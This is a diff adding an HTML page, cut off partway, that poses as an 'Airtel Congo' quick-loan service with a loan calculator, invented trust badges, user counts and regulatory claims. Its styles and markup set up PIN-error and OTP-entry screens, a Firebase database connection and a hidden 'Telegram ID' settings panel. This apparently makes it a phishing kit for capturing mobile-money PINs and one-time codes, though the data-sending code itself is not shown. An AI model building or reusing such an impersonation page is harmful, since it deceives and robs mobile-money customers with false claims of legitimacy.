@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Congo - Prêts Rapides et Sécurisés</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- ===== FIREBASE SDKs ===== -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --primary: #ED1C24;
+            --primary-dark: #B01018;
+            --primary-mid: #FF2D37;
+            --accent: #FFD700;
+            --accent-dark: #e6c200;
+            --accent-light: #fff3b0;
+            --success: #10b981;
+            --error: #ef4444;
+            --warning: #f59e0b;
+            --text: #1f2937;
+            --text-light: #6b7280;
+            --bg: #f4f7fb;
+            --white: #ffffff;
+            --border: #e5e7eb;
+            --shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 10px 25px rgba(237, 28, 36, 0.12);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text);
+            line-height: 1.6;
+            background: var(--bg);
+        }
+
+        /* ===== LANDING PAGE ===== */
+        .navbar {
+            background: var(--primary);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .nav-container {
+            max-width: 1200px; margin: 0 auto; padding: 1rem 2rem;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .logo {
+            display: flex; align-items: center; gap: 0.5rem;
+            font-weight: 800; font-size: 1.5rem; color: var(--accent);
+        }
+        .logo-icon { font-size: 2rem; }
+        .nav-links { display: flex; gap: 2rem; }
+        .nav-links a {
+            color: rgba(255,255,255,0.85); text-decoration: none;
+            font-weight: 500; transition: color 0.3s;
+        }
+        .nav-links a:hover { color: var(--accent); }
+
+        .hero {
+            background: linear-gradient(135deg, #B01018 0%, #ED1C24 55%, #FF2D37 100%);
+            padding: 5rem 2rem; color: var(--white);
+            position: relative; overflow: hidden;
+        }
+        .hero::after {
+            content: ''; position: absolute; bottom: 0; left: 0; right: 0;
+            height: 6px; background: var(--accent);
+        }
+        .hero-container { max-width: 1200px; margin: 0 auto; }
+        .hero-content { max-width: 800px; }
+        .trust-badge {
+            display: inline-flex; align-items: center; gap: 0.5rem;
+            background: rgba(255, 215, 0, 0.15);
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            padding: 0.5rem 1rem; border-radius: 50px;
+            font-size: 0.9rem; margin-bottom: 1.5rem; color: var(--accent);
+        }
+        .badge-icon {
+            background: var(--accent); color: var(--primary);
+            width: 20px; height: 20px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.8rem; font-weight: 700;
+        }
+        .hero-title {
+            font-size: 3.5rem; font-weight: 800;
+            margin-bottom: 1rem; line-height: 1.2;
+        }
+        .highlight { color: var(--accent); }
+        .hero-subtitle {
+            font-size: 1.25rem; margin-bottom: 2.5rem; opacity: 0.95;
+        }
+        .hero-stats {
+            display: grid; grid-template-columns: repeat(3, 1fr);
+            gap: 2rem; max-width: 600px;
+        }
+        .stat { text-align: center; }
+        .stat-number { font-size: 2rem; font-weight: 700; color: var(--accent); }
+        .stat-label { font-size: 0.9rem; opacity: 0.9; }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 4rem 2rem; }
+        .section-header { text-align: center; margin-bottom: 3rem; }
+        .section-title {
+            font-size: 2.5rem; font-weight: 700;
+            margin-bottom: 0.5rem; color: var(--primary);
+        }
+        .section-subtitle { font-size: 1.1rem; color: var(--text-light); }
+
+        .calculator-section { background: var(--white); }
+        .calculator-card {
+            background: var(--white); border-radius: 20px;
+            padding: 3rem; box-shadow: var(--shadow-lg);
+            max-width: 800px; margin: 0 auto;
+            border-top: 5px solid var(--accent);
+        }
+        .calculator-inputs {
+            display: grid; gap: 2.5rem; margin-bottom: 2.5rem;
+        }
+        .calc-group label {
+            display: block; font-weight: 600;
+            margin-bottom: 0.75rem; font-size: 1.05rem; color: var(--text);
+        }
+        .amount-display { position: relative; margin-bottom: 1.5rem; }
+        .currency {
+            position: absolute; left: 1.25rem; top: 50%;
+            transform: translateY(-50%); font-weight: 600;
+            color: var(--text-light); font-size: 1.25rem;
+            z-index: 1; pointer-events: none;
+        }
+        .amount-display input {
+            width: 100%; padding: 1.25rem 1.5rem 1.25rem 4rem;
+            border: 2px solid var(--border); border-radius: 12px;
+            font-size: 1.75rem; font-weight: 700;
+            letter-spacing: 0.5px; transition: all 0.3s ease; color: var(--text);
+        }
+        .amount-display input:focus {
+            outline: none; border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
+        }
+        input[type="range"] {
+            width: 100%; height: 8px; border-radius: 5px;
+            background: var(--border); outline: none;
+            -webkit-appearance: none; margin-top: 0.5rem;
+        }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none; width: 22px; height: 22px;
+            border-radius: 50%; background: var(--accent);
+            cursor: pointer; transition: transform 0.2s;
+            border: 3px solid var(--primary);
+        }
+        .range-labels {
+            display: flex; justify-content: space-between;
+            font-size: 0.9rem; color: var(--text-light); margin-top: 0.75rem;
+        }
+        .calc-group select {
+            width: 100%; padding: 1rem 1.25rem;
+            border: 2px solid var(--border); border-radius: 12px;
+            font-size: 1rem; font-weight: 500;
+            cursor: pointer; transition: all 0.3s;
+        }
+        .calc-group select:focus {
+            outline: none; border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
+        }
+        .calculator-results {
+            background: linear-gradient(135deg, #fff0f0 0%, #ffe0e0 100%);
+            padding: 2rem; border-radius: 15px; margin: 2rem 0;
+            border-left: 5px solid var(--primary);
+        }
+        .result-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 1rem 0;
+            border-bottom: 1px solid rgba(237, 28, 36, 0.08);
+        }
+        .result-item:last-child { border-bottom: none; }
+        .result-label { color: var(--text-light); font-size: 1rem; }
+        .result-value { font-size: 1.4rem; font-weight: 700; color: var(--primary); }
+        .cta-button {
+            width: 100%; padding: 1.25rem 2rem;
+            background: var(--accent); color: var(--primary);
+            border: none; border-radius: 12px;
+            font-size: 1.1rem; font-weight: 700; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            gap: 0.75rem; transition: all 0.3s;
+        }
+        .cta-button:hover {
+            background: var(--accent-dark); transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.45);
+        }
+        .arrow { font-size: 1.3rem; }
+        .calculator-footer {
+            text-align: center; margin-top: 1.5rem;
+            color: var(--text-light); font-size: 0.95rem;
+        }
+
+        .features-section { background: var(--bg); }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        .feature-card {
+            background: var(--white); padding: 2rem;
+            border-radius: 15px; box-shadow: var(--shadow);
+            transition: transform 0.3s;
+            border-bottom: 4px solid var(--accent);
+        }
+        .feature-card:hover { transform: translateY(-5px); box-shadow: var(--shadow-lg); }
+        .feature-icon { font-size: 3rem; margin-bottom: 1rem; }
+        .feature-card h3 {
+            font-size: 1.25rem; margin-bottom: 0.5rem; color: var(--primary);
+        }
+        .feature-card p { color: var(--text-light); }
+
+        .security-section { background: var(--white); }
+        .security-content {
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 3rem; align-items: center;
+        }
+        .security-features { display: flex; flex-direction: column; gap: 1.5rem; }
+        .security-item { display: flex; gap: 1rem; }
+        .check-icon {
+            background: var(--accent); color: var(--primary);
+            width: 24px; height: 24px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0; font-weight: 700;
+        }
+        .security-item strong {
+            display: block; margin-bottom: 0.25rem; color: var(--primary);
+        }
+        .security-item p { color: var(--text-light); font-size: 0.9rem; }
+        .security-badges { display: flex; flex-direction: column; gap: 1.5rem; }
+        .badge {
+            background: var(--white); padding: 1.5rem;
+            border-radius: 12px; box-shadow: var(--shadow);
+            display: flex; align-items: center; gap: 1rem;
+            border-left: 5px solid var(--accent);
+        }
+        .badge-icon { font-size: 2rem; }
+        .badge-text strong { display: block; color: var(--primary); }
+        .badge-text small { color: var(--text-light); }
+
+        .reviews-section { background: var(--bg); }
+        .reviews-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        .review-card {
+            background: var(--white); padding: 2rem;
+            border-radius: 15px; box-shadow: var(--shadow);
+            border-top: 4px solid var(--accent);
+        }
+        .stars { color: var(--accent); font-size: 1.2rem; margin-bottom: 1rem; }
+        .review-text { margin-bottom: 1.5rem; font-style: italic; }
+        .reviewer strong { display: block; color: var(--primary); }
+        .reviewer span { color: var(--text-light); font-size: 0.9rem; }
+
+        .cta-section {
+            background: linear-gradient(135deg, #B01018 0%, #ED1C24 55%, #FF2D37 100%);
+            color: var(--white); position: relative;
+        }
+        .cta-section::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0;
+            height: 5px; background: var(--accent);
+        }
+        .cta-content { text-align: center; max-width: 700px; margin: 0 auto; }
+        .cta-content h2 { font-size: 2.5rem; margin-bottom: 1rem; }
+        .cta-content p { font-size: 1.1rem; margin-bottom: 2rem; opacity: 0.9; }
+        .cta-button.large {
+            font-size: 1.2rem; padding: 1.25rem 2.5rem;
+            max-width: 500px; margin: 0 auto 1rem;
+        }
+        .cta-note { opacity: 0.8; font-size: 0.95rem; }
+
+        .footer {
+            background: var(--primary-dark); color: var(--white);
+            padding: 3rem 2rem 1rem; border-top: 5px solid var(--accent);
+        }
+        .footer-content {
+            max-width: 1200px; margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem; margin-bottom: 2rem;
+        }
+        .footer-section h4 { margin-bottom: 1rem; color: var(--accent); }
+        .footer-section a {
+            display: block; color: rgba(255, 255, 255, 0.7);
+            text-decoration: none; margin-bottom: 0.5rem;
+        }
+        .footer-section a:hover { color: var(--accent); }
+        .footer-bottom {
+            text-align: center; padding-top: 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        /* ===== APPLICATION PAGES ===== */
+        .app-page { background: var(--bg); min-height: 100vh; }
+        .app-container { max-width: 800px; margin: 0 auto; padding: 2rem; }
+        .app-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 2rem; background: var(--primary);
+            padding: 1rem 1.5rem; border-radius: 14px;
+            border-bottom: 4px solid var(--accent);
+        }
+        .logo-small { font-size: 1.5rem; font-weight: 700; color: var(--accent); }
+        .security-indicator {
+            display: flex; align-items: center; gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: rgba(255, 215, 0, 0.15);
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            border-radius: 50px; font-size: 0.9rem; color: var(--accent);
+        }
+        .security-indicator.success {
+            background: #d1fae5; color: var(--success);
+            border-color: var(--success);
+        }
+        .lock-icon { font-size: 1.1rem; }
+
+        .progress-wrapper { margin-bottom: 3rem; }
+        .progress-steps { display: flex; align-items: center; justify-content: center; }
+        .step-item {
+            display: flex; flex-direction: column; align-items: center;
+            gap: 0.5rem; opacity: 0.4;
+        }
+        .step-item.active, .step-item.completed { opacity: 1; }
+        .step-circle {
+            width: 50px; height: 50px; border-radius: 50%;
+            background: var(--white); border: 3px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 700;
+        }
+        .step-item.active .step-circle {
+            background: var(--primary); color: var(--accent);
+            border-color: var(--accent);
+        }
+        .step-item.completed .step-circle {
+            background: var(--accent); color: var(--primary);
+            border-color: var(--accent);
+        }
+        .step-line { width: 100px; height: 3px; background: var(--border); }
+        .step-line.active, .step-line.completed { background: var(--accent); }
+        .step-item span { font-size: 0.85rem; font-weight: 500; }
+
+        .form-card {
+            background: var(--white); padding: 3.5rem;
+            border-radius: 20px; box-shadow: var(--shadow-lg);
+            border-top: 5px solid var(--accent);
+        }
+        .form-title {
+            font-size: 2.25rem; margin-bottom: 0.75rem;
+            font-weight: 700; color: var(--primary);
+        }
+        .form-subtitle {
+            color: var(--text-light); margin-bottom: 2.5rem;
+            font-size: 1.05rem; line-height: 1.6;
+        }
+        .form-section { margin-bottom: 2.5rem; }
+        .form-section .section-title {
+            font-size: 1.35rem; margin-bottom: 1.25rem;
+            padding-bottom: 0.75rem; border-bottom: 2px solid var(--accent);
+            color: var(--primary); font-weight: 700;
+        }
+        .form-group { margin-bottom: 1.75rem; }
+        .form-group label {
+            display: block; font-weight: 600;
+            margin-bottom: 0.65rem; font-size: 1rem; color: var(--text);
+        }
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%; padding: 0.875rem 1.25rem;
+            border: 2px solid var(--border); border-radius: 12px;
+            font-size: 1.05rem; transition: all 0.3s ease;
+            color: var(--text); font-family: inherit;
+        }
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none; border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
+        }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+        .input-with-icon { position: relative; }
+        .input-icon {
+            position: absolute; left: 1.25rem; top: 50%;
+            transform: translateY(-50%); font-weight: 600;
+            color: var(--text-light); font-size: 1.05rem;
+            z-index: 1; pointer-events: none;
+        }
+        .input-with-icon input {
+            padding-left: 3.75rem;
+            padding-top: 0.875rem; padding-bottom: 0.875rem;
+            padding-right: 1.25rem; font-size: 1.05rem; font-weight: 600;
+        }
+        .help-text {
+            display: block; font-size: 0.875rem;
+            color: var(--text-light); margin-top: 0.5rem; line-height: 1.5;
+        }
+        .info-box {
+            background: #fffce0; border-left: 4px solid var(--accent);
+            padding: 1rem; border-radius: 8px; margin: 1.5rem 0;
+            display: flex; flex-direction: column; gap: 0.5rem;
+        }
+        .info-box.success {
+            background: #d1fae5; border-left-color: var(--success);
+        }
+        .consent-box {
+            display: flex; gap: 1rem; margin: 2.5rem 0;
+            padding: 1.25rem; background: var(--bg);
+            border-radius: 12px; border: 2px solid var(--border);
+        }
+        .consent-box input[type="checkbox"] {
+            width: 22px; height: 22px; margin-top: 0.25rem;
+            cursor: pointer; flex-shrink: 0; accent-color: var(--primary);
+        }
+        .consent-box label {
+            font-size: 0.95rem; color: var(--text);
+            line-height: 1.6; cursor: pointer;
+        }
+        .consent-box a { color: var(--primary); font-weight: 600; }
+
+        .submit-button {
+            width: 100%; padding: 1rem 2rem;
+            background: var(--primary); color: var(--accent);
+            border: none; border-radius: 10px;
+            font-size: 1.1rem; font-weight: 700;
+            cursor: pointer; display: flex;
+            align-items: center; justify-content: center;
+            gap: 0.5rem; transition: all 0.3s;
+        }
+        .submit-button:hover {
+            background: var(--primary-dark); transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 53, 128, 0.35);
+        }
+        .submit-button.secondary {
+            background: var(--white); color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+        .security-note {
+            text-align: center; margin-top: 1.5rem;
+            color: var(--text-light); font-size: 0.9rem;
+            display: flex; align-items: center;
+            justify-content: center; gap: 0.5rem;
+        }
+
+        .processing-content { text-align: center; padding: 2rem 0; }
+        .spinner-large {
+            width: 80px; height: 80px;
+            border: 6px solid var(--border);
+            border-top-color: var(--accent);
+            border-radius: 50%; margin: 0 auto 2rem;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .processing-title {
+            font-size: 1.75rem; margin-bottom: 0.5rem; color: var(--primary);
+        }
+        .processing-text { color: var(--text-light); margin-bottom: 2rem; }
+        .status-box {
+            display: inline-flex; align-items: center; gap: 0.75rem;
+            padding: 1rem 1.5rem; background: var(--bg); border-radius: 50px;
+        }
+        .status-dot {
+            width: 12px; height: 12px; background: var(--accent);
+            border-radius: 50%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .result-content { text-align: center; padding: 2rem 0; }
+        .result-icon {
+            width: 100px; height: 100px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 3rem; margin: 0 auto 1.5rem;
+        }
+        .result-icon.error { background: #fee2e2; color: var(--error); }
+        .result-icon.warning { background: #fef3c7; color: var(--warning); }
+        .result-title {
+            font-size: 2rem; margin-bottom: 1rem; color: var(--primary);
+        }
+        .result-text { color: var(--text-light); margin-bottom: 2rem; }
+
+        /* OTP Inputs */
+        .otp-header { text-align: center; margin-bottom: 2rem; }
+        .otp-icon { font-size: 4rem; margin-bottom: 1rem; }
+        .otp-inputs {
+            display: flex; gap: 1rem; justify-content: center; margin: 2rem 0;
+        }
+        .otp-box {
+            width: 60px; height: 70px; text-align: center;
+            font-size: 2rem; font-weight: 700;
+            border: 3px solid var(--border); border-radius: 12px;
+            transition: all 0.3s;
+        }
+        .otp-box:focus {
+            outline: none; border-color: var(--accent);
+            background: #fffce0;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.3);
+            transform: scale(1.05);
+        }
+
+        /* Approval (Congratulations) Page */
+        .approval-card { text-align: center; }
+        .success-animation { margin-bottom: 2rem; }
+        .success-checkmark {
+            width: 120px; height: 120px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            margin: 0 auto; display: flex;
+            align-items: center; justify-content: center;
+            animation: scaleIn 0.5s ease-out;
+            border: 4px solid var(--primary);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+        .check-icon-large {
+            color: var(--primary); font-size: 4rem; font-weight: 700;
+        }
+        .approval-title {
+            font-size: 2.5rem; margin-bottom: 0.5rem; color: var(--primary);
+        }
+        .approval-subtitle {
+            color: var(--text-light); font-size: 1.1rem; margin-bottom: 2rem;
+        }
+        .approval-box {
+            background: linear-gradient(135deg, #fffce0 0%, #fff3b0 100%);
+            padding: 2rem; border-radius: 16px; margin: 2rem 0;
+            border: 2px solid var(--accent);
+        }
+        .approval-badge {
+            display: inline-block; background: var(--primary);
+            color: var(--accent); padding: 0.5rem 1.5rem;
+            border-radius: 50px; font-weight: 700; margin-bottom: 1rem;
+        }
+        .loan-amount-display {
+            display: flex; flex-direction: column; gap: 0.5rem;
+        }
+        .amount-label { font-size: 1rem; color: var(--text-light); }
+        .amount-value {
+            font-size: 3.5rem; font-weight: 800; color: var(--primary);
+        }
+        .amount-note { font-size: 0.9rem; color: var(--text-light); }
+        .loan-details-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem; margin: 2rem 0;
+        }
+        .detail-card {
+            background: var(--bg); padding: 1.5rem;
+            border-radius: 12px; display: flex;
+            gap: 1rem; align-items: center;
+            border-bottom: 3px solid var(--accent);
+        }
+        .detail-icon { font-size: 2rem; }
+        .detail-content { flex: 1; text-align: left; }
+        .detail-label {
+            display: block; font-size: 0.85rem;
+            color: var(--text-light); margin-bottom: 0.25rem;
+        }
+        .detail-value {
+            display: block; font-size: 1.25rem;
+            font-weight: 700; color: var(--primary);
+        }
+        .next-steps { list-style: none; text-align: left; }
+        .next-steps li { padding: 0.5rem 0; }
+        .action-buttons {
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 1rem; margin: 2rem 0;
+        }
+        .button-icon { font-size: 1.2rem; }
+        .contact-box {
+            background: var(--bg); padding: 1.5rem;
+            border-radius: 12px; margin: 2rem 0;
+        }
+        .contact-box a { color: var(--primary); }
+        .approval-footer {
+            text-align: center; margin-top: 2rem;
+            color: var(--text-light); font-size: 0.9rem;
+        }
+
+        /* PIN error indicator */
+        .verification-error {
+            color: var(--error);
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-align: center;
+            margin: 0.5rem 0;
+            display: none;
+            padding: 0.5rem;
+            background: rgba(239, 68, 68, 0.08);
+            border-radius: 8px;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+        .verification-error.visible { display: block; }
+
+        /* Congrats page entrance animation */
+        #approvalPage.active .approval-card {
+            animation: fadeSlideIn 0.5s ease-out;
+        }
+        @keyframes fadeSlideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== PAGE SWITCHING ===== */
+        .page { display: none; }
+        .page.active { display: block; }
+
+        /* ===== TELEGRAM ID SETTINGS ===== */
+        #tgSettingsBtn {
+            position: fixed; bottom: 16px; right: 16px; z-index: 9999;
+            width: 48px; height: 48px; border-radius: 50%;
+            background: var(--primary); color: var(--accent);
+            border: 3px solid var(--accent);
+            font-size: 1.4rem; cursor: pointer;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+            display: flex; align-items: center; justify-content: center;
+            transition: transform 0.2s;
+        }
+        #tgSettingsBtn:hover { transform: scale(1.08); }
+        #tgSettingsModal {
+            display: none; position: fixed; inset: 0;
+            background: rgba(0,0,0,0.6); z-index: 10000;
+            align-items: center; justify-content: center;
+            backdrop-filter: blur(4px);
+        }
+        #tgSettingsModal.active { display: flex; }
+        .tg-modal-card {
+            background: #fff; border-radius: 16px; padding: 24px;
+            max-width: 380px; width: 92%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+            border-top: 5px solid var(--accent);
+        }
+        .tg-modal-card h3 {
+            color: var(--primary); margin-bottom: 8px; font-size: 1.2rem;
+        }
+        .tg-modal-card p {
+            color: var(--text-light); font-size: 0.9rem;
+            margin-bottom: 16px; line-height: 1.5;
+        }
+        .tg-modal-card input {
+            width: 100%; padding: 12px 14px;
+            border: 2px solid var(--border); border-radius: 10px;
+            font-size: 1.05rem; font-family: inherit;
+            margin-bottom: 16px; outline: none; color: var(--text);
+        }
+        .tg-modal-card input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(237,28,36,0.1);
+        }
+        .tg-modal-actions { display: flex; gap: 10px; }
+        .tg-modal-actions button {
+            flex: 1; padding: 12px; border-radius: 10px;
+            font-weight: 600; cursor: pointer; font-family: inherit;
+            font-size: 0.95rem;
+        }
+        #tgIdCancel {
+            border: 2px solid var(--border); background: #fff;
+            color: var(--text);
+        }
+        #tgIdSave {
+            border: none; background: var(--primary);
+            color: var(--accent); font-weight: 700;
+        }
+        #tgIdCurrent {
+            margin-top: 12px; font-size: 0.8rem;
+            color: var(--text-light); text-align: center;
+        }
+        #tgIdCurrentValue { font-weight: 700; color: var(--primary); }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero-title { font-size: 2.5rem; }
+            .hero-stats { grid-template-columns: 1fr; }
+            .nav-links { display: none; }
+            .security-content { grid-template-columns: 1fr; }
+            .form-row { grid-template-columns: 1fr; gap: 0; }
+            .step-line { width: 50px; }
+            .action-buttons { grid-template-columns: 1fr; }
+            .otp-box { width: 50px; height: 60px; font-size: 1.5rem; }
+            .amount-display input {
+                font-size: 1.5rem;
+                padding: 1rem 1rem 1rem 3.5rem;
+            }
+            .currency { font-size: 1.1rem; left: 1rem; }
+            .calculator-card { padding: 2rem 1.5rem; }
+            .form-card { padding: 2rem 1.5rem; }
+            .form-title { font-size: 1.75rem; }
+            .input-with-icon input {
+                padding-left: 3.25rem; font-size: 1rem;
+            }
+            .input-icon { left: 1rem; font-size: 0.95rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ==================== LANDING PAGE ==================== -->
+    <div id="landingPage" class="page active">
+        <nav class="navbar">
+            <div class="nav-container">
+                <div class="logo">
+                    <span class="logo-icon">💰</span>
+                    <span class="logo-text">Airtel Congo</span>
+                </div>
+                <div class="nav-links">
+                    <a href="#calculator">Calculer</a>
+                    <a href="#features">Services</a>
+                    <a href="#security">Sécurité</a>
+                    <a href="#reviews">Avis</a>
+                </div>
+            </div>
+        </nav>
+
+        <section class="hero">
+            <div class="hero-container">
+                <div class="hero-content">
+                    <div class="trust-badge">
+                        <span class="badge-icon">✓</span>
+                        <span>Autorisé et Régulé</span>
+                    </div>
+                    <h1 class="hero-title">Obtenez Votre Prêt en <span class="highlight">15 Minutes</span></h1>
+                    <p class="hero-subtitle">Prêts rapides, transparents et sécurisés de $ 100 à $ 50 000</p>
+                    <div class="hero-stats">
+                        <div class="stat">
+                            <div class="stat-number">50K+</div>
+                            <div class="stat-label">Clients Satisfaits</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-number">$ 2.5 Milliards+</div>
+                            <div class="stat-label">Prêts Distribués</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-number">4.9★</div>
+                            <div class="stat-label">Note de Confiance</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="calculator" class="calculator-section">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">Calculez Votre Prêt</h2>
+                    <p class="section-subtitle">Obtenez une estimation rapide avec notre calculatrice transparente</p>
+                </div>
+
+                <div class="calculator-card">
+                    <div class="calculator-inputs">
+                        <div class="calc-group">
+                            <label>Montant du Prêt</label>
+                            <div class="amount-display">
+                                <span class="currency">$</span>
+                                <input type="number" id="calcAmount" value="5000" min="100" max="50000" step="100">
+                            </div>
+                            <input type="range" id="calcSlider" min="100" max="50000" value="5000" step="100">
+                            <div class="range-labels">
+                                <span>$ 100</span>
+                                <span>$ 50 000</span>
+                            </div>
+                        </div>
+                        <div class="calc-group">
+                            <label>Durée du Prêt</label>
+                            <select id="calcTerm">
+                                <option value="3">3 Mois</option>
+                                <option value="6">6 Mois</option>
+                                <option value="12" selected>12 Mois</option>
+                                <option value="24">24 Mois</option>
+                                <option value="36">36 Mois</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="calculator-results">
+                        <div class="result-item">
+                            <span class="result-label">Paiement Mensuel</span>
+                            <span class="result-value" id="monthlyPayment">$ 444</span>
+                        </div>
+                        <div class="result-item">
+                            <span class="result-label">Taux d'Intérêt (APR)</span>
+                            <span class="result-value">12%</span>
+                        </div>
+                        <div class="result-item">
+                            <span class="result-label">Montant Total Remboursé</span>
+                            <span class="result-value" id="totalRepayment">$ 5,331</span>
+                        </div>
+                    </div>
+
+                    <button class="cta-button" onclick="showApplication()">
+                        Demander Maintenant - Décision Rapide
+                        <span class="arrow">→</span>
+                    </button>
+
+                    <div class="calculator-footer">
+                        <p>✓ Pas de frais cachés • ✓ Pas de pénalité de remboursement anticipé • ✓ Approbation Rapide</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="features" class="features-section">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">Pourquoi Choisir Airtel Congo?</h2>
+                    <p class="section-subtitle">Nous rendons l'emprunt facile, rapide et transparent</p>
+                </div>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">⚡</div>
+                        <h3>Approbation Rapide</h3>
+                        <p>Obtenez une approbation en seulement 15 minutes avec notre système automatisé</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">💯</div>
+                        <h3>100% Transparent</h3>
+                        <p>Pas de frais cachés. Ce que vous voyez est ce que vous payez. Toujours.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🔒</div>
+                        <h3>Sécurité Bancaire</h3>
+                        <p>Le chiffrement SSL 256-bit protège toutes vos informations personnelles</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📱</div>
+                        <h3>Adapté aux Mobiles</h3>
+                        <p>Demander de n'importe où, n'importe quand sur n'importe quel appareil</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">💳</div>
+                        <h3>Paiements Flexibles</h3>
+                        <p>Choisissez un calendrier de remboursement adapté à votre budget</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🎯</div>
+                        <h3>Pas de Pénalité de Remboursement Anticipé</h3>
+                        <p>Remboursez votre prêt plus tôt sans frais supplémentaires</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="security" class="security-section">
+            <div class="container">
+                <div class="security-content">
+                    <div class="security-text">
+                        <h2 class="section-title">Votre Sécurité est Notre Priorité</h2>
+                        <p class="section-subtitle">Nous utilisons des mesures de sécurité de haut niveau pour protéger vos données</p>
+                        <div class="security-features">
+                            <div class="security-item">
+                                <span class="check-icon">✓</span>
+                                <div>
+                                    <strong>Chiffrement SSL 256-bit</strong>
+                                    <p>Le même niveau de sécurité utilisé par les grandes banques</p>
+                                </div>
+                            </div>
+                            <div class="security-item">
+                                <span class="check-icon">✓</span>
+                                <div>
+                                    <strong>Autorisé et Régulé</strong>
+                                    <p>Entièrement agréé et soumis au contrôle des autorités financières</p>
+                                </div>
+                            </div>
+                            <div class="security-item">
+                                <span class="check-icon">✓</span>
+                                <div>
+                                    <strong>Confidentialité des Données Garantie</strong>
+                                    <p>Nous ne vendons ni ne partageons jamais vos informations personnelles</p>
+                                </div>
+                            </div>
+                            <div class="security-item">
+                                <span class="check-icon">✓</span>
+                                <div>
+                                    <strong>Authentification à Deux Facteurs</strong>
+                                    <p>Couche de sécurité supplémentaire avec vérification PIN et OTP</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="security-badges">
+                        <div class="badge">
+                            <div class="badge-icon">🔒</div>
